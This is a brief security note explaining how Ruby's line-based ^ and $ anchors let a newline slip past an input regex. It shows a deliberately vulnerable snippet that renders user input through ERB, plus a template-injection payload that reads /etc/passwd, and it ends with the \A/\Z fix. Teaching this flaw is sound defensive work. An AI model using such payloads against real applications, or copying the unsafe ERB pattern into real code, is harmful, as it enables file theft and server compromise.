# Ruby Regex bypass
In ruby, the **^** and **$** match at the start and end of each line. So if any (!) one line is matching, we have a successful match.

### Example: 
```
  if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = ERB.new(params[:neon]).result(binding)
      #@neon = "Malicious Input Detected"
```
	  
In the previous code the regex is checking that only numbers and letters are insered otherwise it will will not pass the check. 
If we take as granted that ^ is the starting point of the string range and $ is the end of the string range this means that we can effectively bypass it by using \n(new line)
Because ^ and $ will match start and end of only one line!

Bypass Example: The solution to previous problem will be then
example`\n<payload>`
```
or: example\n<%= File.open('/etc/passwd').read %> #Read file
```

To match strictly at the start of a string and not just on every line (after a \n) you need to use \A and \Z instead of **^** and **$**.
